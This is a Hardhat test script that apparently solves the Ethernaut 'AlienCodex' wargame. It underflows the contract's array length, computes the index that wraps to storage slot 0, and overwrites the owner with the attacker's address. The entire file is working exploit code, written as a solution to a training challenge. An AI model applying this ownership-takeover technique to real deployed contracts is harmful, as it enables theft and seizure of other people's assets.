import { expect } from 'chai';
import { ethers } from 'hardhat';
import { Wallet, BigNumber } from 'ethers';

describe('AlienCodex', function () {
  let owner: Wallet;
  let user: Wallet;
  it('attack', async function () {
    [owner, user] = await (ethers as any).getSigners();
    const AlienCodex = await ethers.getContractFactory('AlienCodex');
    const alienCodex = await AlienCodex.deploy();
    await alienCodex.connect(owner).deployed();
    console.log('owner:', await alienCodex.owner());

    // Start to attck
    await alienCodex.make_contact();
    console.log('contact', await alienCodex.contact());

    await alienCodex.retract();

    const hash = ethers.utils.keccak256(ethers.utils.hexZeroPad(ethers.utils.hexlify(1), 32));
    console.log('hash', hash.toString());

    const idx = ethers.constants.MaxUint256.sub(hash).add(BigNumber.from('1'));
    console.log('idx', idx.toString());

    const newAddr = ethers.utils.hexZeroPad(user.address, 32);
    console.log('newAddr', newAddr);

    await alienCodex.revise(idx, newAddr);
    console.log('owner:', await alienCodex.owner());

    expect(await alienCodex.owner()).to.be.eq(user.address);
  });
});
